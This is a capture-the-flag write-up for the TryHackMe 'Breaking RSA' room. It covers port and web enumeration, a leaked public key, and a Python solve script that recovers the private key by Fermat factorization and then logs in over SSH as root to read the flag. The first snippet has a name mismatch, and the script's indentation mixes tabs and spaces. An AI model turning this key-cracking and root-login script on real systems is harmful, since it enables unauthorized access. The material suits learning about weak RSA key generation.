```python
#!/usr/bin/python3
import gmpy2
def fermat_factorization(n):
    """Fermat's Factorization Method"""
    a = gmpy2.isqrt(n) + 1
    b2 = gmpy2.square(a) - n
    while not gmpy2.is_square(b2):
        a += 1
        b2 = gmpy2.square(a) - n
    p = a + gmpy2.isqrt(b2)
    q = a - gmpy2.isqrt(b2)
    return p, q

print(factorize(105327569))
```
## Enumeration
```bash
┌──(kali㉿kali)-[~/Desktop/THM/BreakingRSA]
└─$ export IP=10.10.94.137
                                                                             
┌──(kali㉿kali)-[~/Desktop/THM/BreakingRSA]
└─$ echo $IP              
10.10.94.137
                                                                             
┌──(kali㉿kali)-[~/Desktop/THM/BreakingRSA]
└─$ nmap -p- -sCV --min-rate 10000 $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-22 21:44 EDT
Warning: 10.10.94.137 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.94.137
Host is up (0.11s latency).
Not shown: 48282 filtered tcp ports (no-response), 17251 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ff:8c:c9:bb:9c:6f:6e:12:92:c0:96:0f:b5:58:c6:f8 (RSA)
|   256 67:ff:d4:09:ee:2c:8d:eb:94:b3:af:17:8e:dc:94:ae (ECDSA)
|_  256 81:0e:b2:0e:f6:64:76:3c:c3:39:72:c1:29:59:c3:3c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Jack Of All Trades
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.62 seconds
                                                                             
```

### Web Enumeration
```bash
feroxbuster --smart -u http://10.10.108.5/
                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.108.5/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🎶  Auto Tune             │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       21l       45w      384c http://10.10.108.5/
301      GET        7l       12w      178c http://10.10.108.5/development => http://10.10.108.5/development/
200      GET        1l        2w      725c http://10.10.108.5/development/id_rsa.pub
200      GET        9l       46w      321c http://10.10.108.5/development/log.txt
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_108_5_-1711158625.state ...
[##>-----------------] - 11s     4275/30023   68s     found:4       errors:0      
[##>-----------------] - 11s     4243/30000   374/s   http://10.10.108.5/ 
[####################] - 0s     30000/30000   131579/s http://10.10.108.5/development/ => Directory listing
[--------------------] - 0s         0/30000   -       http://10.10.108.5/development/id_rsa.pub 
````
- Found: `http://10.10.108.5/development/id_rsa.pub`, `http://10.10.108.5/development/log.txt`
**log.txt**
```
The library we are using to generate SSH keys implements RSA poorly. The two
randomly selected prime numbers (p and q) are very close to one another. Such
bad keys can easily be broken with Fermat's factorization method.

Also, SSH root login is enabled.

<https://github.com/murtaza-u/zet/tree/main/20220808171808>

---
```

**id_rsa.pub**
```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDrZh8oe8Q8j6kt26IZ906kZ7XyJ3sFCVczs1Gqe8w7ZgU+XGL2vpSD100andPQMwDi3wMX98EvEUbTtcoM4p863C3h23iUOpmZ3Mw8z51b9DEXjPLunPnwAYxhIxdP7czKlfgUCe2n49QHuTqtGE/Gs+avjPcPrZc3VrGAuhFM4P+e4CCbd9NzMtBXrO5HoSV6PEw7NSR7sWDcAQ47cd287U8h9hIf9Paj6hXJ8oters0CkgfbuG99SVVykoVkMfiRXIpu+Ir8Fu1103Nt/cv5nJX5h/KpdQ8iXVopmQNFzNFJjU2De9lohLlUZpM81fP1cDwwGF3X52FzgZ7Y67Je56Rz/fc8JMhqqR+N5P5IyBcSJlfyCSGTfDf+DNiioRGcPFIwH+8cIv9XUe9QFKo9tVI8ElE6U80sXxUYvSg5CPcggKJy68DET2TSxO/AGczxBjSft/BHQ+vwcbGtEnWgvZqyZ49usMAfgz0t6qFp4g1hKFCutdMMvPoHb1xGw9b1FhbLEw6j9s7lMrobaRu5eRiAcIrJtv+5hqX6r6loOXpd0Ip1hH/Ykle2fFfiUfNWCcFfre2AIQ1px9pL0tg8x1NHd55edAdNY3mbk3I66nthA5a0FrKrnEgDXLVLJKPEUMwY8JhAOizdOCpb2swPwvpzO32OjjNus7tKSRe87w==
```
- This appears to be a typical RSA Public Key entry for SSH Public Key authentication. (By said user providing the private key on command line use i.e, `ssh -i id_rsa.priv ......`).

After a bit of googling, I found you can convert this to a typical PEM RSA key by using the following:
```bash
ssh-keygen -f id_rsa.pub -e -m PEM > id_rsa.pem
                                                                             
┌──(kali㉿kali)-[~/Desktop/THM/BreakingRSA]
└─$ cat id_rsa.pem
-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEA62YfKHvEPI+pLduiGfdOpGe18id7BQlXM7NRqnvMO2YFPlxi9r6U
g9dNGp3T0DMA4t8DF/fBLxFG07XKDOKfOtwt4dt4lDqZmdzMPM+dW/QxF4zy7pz5
8AGMYSMXT+3MypX4FAntp+PUB7k6rRhPxrPmr4z3D62XN1axgLoRTOD/nuAgm3fT
czLQV6zuR6ElejxMOzUke7Fg3AEOO3HdvO1PIfYSH/T2o+oVyfKLXq7NApIH27hv
fUlVcpKFZDH4kVyKbviK/BbtddNzbf3L+ZyV+YfyqXUPIl1aKZkDRczRSY1Ng3vZ
aIS5VGaTPNXz9XA8MBhd1+dhc4Ge2OuyXuekc/33PCTIaqkfjeT+SMgXEiZX8gkh
k3w3/gzYoqERnDxSMB/vHCL/V1HvUBSqPbVSPBJROlPNLF8VGL0oOQj3IICicuvA
xE9k0sTvwBnM8QY0n7fwR0Pr8HGxrRJ1oL2asmePbrDAH4M9LeqhaeINYShQrrXT
DLz6B29cRsPW9RYWyxMOo/bO5TK6G2kbuXkYgHCKybb/uYal+q+paDl6XdCKdYR/
2JJXtnxX4lHzVgnBX63tgCENacfaS9LYPMdTR3eeXnQHTWN5m5NyOup7YQOWtBay
q5xIA1y1SySjxFDMGPCYQDos3TgqW9rMD8L6czt9jo4zbrO7SkkXvO8CAwEAAQ==
-----END RSA PUBLIC KEY-----
```
- You could also just import the raw `id_rsa.pub`... but either way works.

Here is the final solve script: 

```python
#!/usr/bin/env python3
from Crypto.PublicKey import RSA
from Crypto.Util.number import *
import os
import paramiko
import gmpy2

#Print ANSI Colors
def print_colored(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")
# Print banner
def print_banner(text):
    print_colored(f"\n==== {text} ====\n", "93")

# Fermat's factorization algorithm
def factorize(n):
    print_colored("Performing Fermat's factorization...", "95")
    a = gmpy2.isqrt(n) + 1
    b2 = gmpy2.square(a) - n
    while not gmpy2.is_square(b2):
        a += 1
        b2 = gmpy2.square(a) - n
    p = a + gmpy2.isqrt(b2)
    q = a - gmpy2.isqrt(b2)
    return p, q

# Connect VIA SSH given a IP, user, and path to private RSA key for authentication.
def ssh_command(ip, user, key_path):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(ip, username=user, key_filename=key_path)
    stdin, stdout, stderr = ssh_client.exec_command('find / -iname "flag" -exec cat {} \; 2>/dev/null')
    output = stdout.read().decode()
    ssh_client.close()
    return output

def main():
	# Read key parameters from the public key that was converted from .pub
	key = open("id_rsa.pem", "r").read()
    impKey = RSA.import_key(key)
    


    print_banner("Key Details")
    # n
    print_colored(f"N = {impKey.n}", "96")
    # e
    print_colored(f"E = {impKey.e}", "96")
    # Big length of n (one of the questions)
    print_colored(f"Bit length of N: {impKey.n.bit_length()}", "96")
    # Last 10 digits of N the public Modulus...
    print_colored(f"Last ten digits of N (Question 4): {str(impKey.n)[-10:]}", "96")
    # Performing fermat's factorization of N...
    print_banner("Factorizing N")
    p, q = factorize(impKey.n)
    # sanity check
    assert impKey.n == p * q
    print_colored("Factorization successful", "92")
    print_colored(f"p = {p}", "96")
    print_colored(f"q = {q}", "96")

    print_banner("Calculating Private Key Components")
    phi = (p - 1) * (q - 1)
    d = inverse(impKey.e, phi)
    print_colored("Private key components calculated", "92")
    print_colored(f"d = {d}", "96")
    d = int(d)

	# Reconstructing the private key with n, e, d
    print_banner("Reconstructing Private Key")
    key = RSA.construct((impKey.n, impKey.e, d))
    private_key = key.export_key("PEM")
    print_colored("Private key reconstructed", "92")
	# Save the private key to a file, and give the permissions '600' for SSH Key authentication
    print_banner("Saving Private Key")
    with open("id_rsa", "wb") as f:
        f.write(private_key)
    os.chmod("./id_rsa", 0o600)
    print_colored("Private key saved with 600 permissions", "92")

	# Connect via SSH using the private key and run the command on the host, then print the output
    print_banner("SSH Command Execution")
    flag_output = ssh_command("10.10.108.5", "root", "./id_rsa")
    print_colored(f"Flag: {flag_output}", "91")

	# Answer to one of the questions.
    print_banner("Absolute Difference")
    Q6 = abs(p - q)
    print_colored(f"Absolute difference between p and q: {Q6}", "96")

if __name__ == "__main__":
    main()

```

